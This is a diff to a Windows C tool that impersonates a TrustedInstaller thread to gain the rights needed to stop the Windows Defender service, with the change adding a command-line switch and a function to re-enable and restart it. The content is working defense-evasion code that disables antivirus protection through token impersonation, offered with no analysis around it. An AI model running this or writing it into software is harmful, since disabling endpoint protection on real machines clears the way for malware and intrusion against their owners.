@@ -24,7 +24,7 @@ BOOL CheckTrustedInstaller() {
         wprintf(L"Error[OpenService]: %d\n", GetLastError());
         CloseServiceHandle(scm);
         return FALSE;
-    }
+    }   
     if (!QueryServiceStatus(service, &ss)) {
         wprintf(L"Error[QueryServiceStatus]: %d\n", GetLastError());
         CloseServiceHandle(scm);
@@ -64,13 +64,7 @@ void StopDefender() {
         CloseServiceHandle(scm);
         exit(0);
     }
-    //Uncomment code below to enable defender 
-   /* if (ChangeServiceConfig(service, SERVICE_NO_CHANGE, SERVICE_AUTO_START, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
-        wprintf(L"Defender service enabled!");
-        CloseServiceHandle(scm);
-        CloseServiceHandle(service);
-        exit(0);
-    }*/
+   
     wprintf(L"Attempting to stop Defender sevice!\n");
     if (!ControlService(service, SERVICE_CONTROL_STOP, &ss)) {
         wprintf(L"Error[OpenService]: %d\n", GetLastError());
@@ -89,7 +83,43 @@ void StopDefender() {
     CloseServiceHandle(scm);
     CloseServiceHandle(service);
 }
-BOOL Impersonate() {
+
+
+
+void EnableDefender() {
+    SC_HANDLE scm;
+    SC_HANDLE service;
+    SERVICE_STATUS ss;
+    scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (scm == NULL) {
+        wprintf(L"Error[OpenSCManager]: %d\n", GetLastError());
+        exit(0);
+    }
+    service = OpenService(scm, L"windefend", SC_MANAGER_ALL_ACCESS);
+    if (service == NULL) {
+        wprintf(L"Error[OpenService]: %d\n", GetLastError());
+        CloseServiceHandle(scm);
+        exit(0);
+    }
+    if (!ChangeServiceConfig(service, SERVICE_NO_CHANGE, SERVICE_AUTO_START, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
+        wprintf(L"Error[ChangeServiceConfig]: %d\n", GetLastError());
+        CloseServiceHandle(scm);
+        CloseServiceHandle(service);
+        exit(0);
+    }
+    wprintf(L"Defender service enabled!\n");
+    if (!StartService(service, NULL, NULL)) {
+        wprintf(L"Error[StartService]: %d\n", GetLastError());
+        CloseServiceHandle(scm);
+        CloseServiceHandle(service);
+        exit(0);
+    }
+    wprintf(L"Defender started!\n");
+    CloseServiceHandle(scm);
+    CloseServiceHandle(service);
+}
+
+void Impersonate(wchar_t* action) {
     HANDLE hSnap;
     HANDLE hSnap2;
     HANDLE hThread;
@@ -136,7 +166,15 @@ BOOL Impersonate() {
                     sQS.ContextTrackingMode = SECURITY_STATIC_TRACKING;
                     if (NtImpersonateThread(GetCurrentThread(), hThread, &sQS) == 0) {
                         wprintf(L"Thread Impersonated!\n");
-                        return TRUE;
+                        if (wcscmp(action, L"Enable") == 0) {
+                            EnableDefender();
+                            break;
+                        }
+                        else
+                        {
+                            StopDefender();
+                            break;
+                        }
                     }
                 }
 
@@ -147,13 +185,16 @@ BOOL Impersonate() {
 
     } while (Process32Next(hSnap, &process));
 
-    return FALSE;
+   
 }
-int wmain()
+int wmain(int argc,wchar_t* argv[])
 {
-    if (CheckTrustedInstaller()) {
-        if (Impersonate()) {
-            StopDefender();
+    if (wcscmp(argv[1], L"Enable") == 0 || wcscmp(argv[1], L"Disable") == 0) {
+        if (CheckTrustedInstaller()) {
+            Impersonate(argv[1]);
         }
+    }
+    else {
+        wprintf(L"Usage: %ws <Disable|Enable>\n",argv[0]);
     }
 }
